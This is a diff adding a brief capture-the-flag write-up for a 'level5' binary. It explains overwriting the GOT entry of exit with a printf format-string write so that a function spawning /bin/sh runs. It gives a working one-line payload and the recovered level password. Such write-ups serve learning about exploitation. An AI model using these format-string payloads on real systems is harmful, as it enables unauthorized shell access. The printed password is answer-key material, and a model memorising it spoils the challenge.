@@ -1,0 +1,11 @@
+This time there is still a printf exploit possible, and we have the o function that call system with "/bin/sh". So we must go to this function, but it is not called anywere. Our strategy is to replace the pointer of exit in plt section, which is called in n, with the adress of o. So we get the adress of this poitner :
+objdump -R ./level5
+...
+08049838 R_386_JUMP_SLOT   exit
+...
+
+We reuse the same exploit as before and write the new adress with the printf format string:
+
+cat <(python -c 'print("\x39\x98\x04\x08" + "\x38\x98\x04\x08" + "%124x%4$hhn" + "%32x%5$hhn")') - | ./level5
+
+cat .pass -> d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
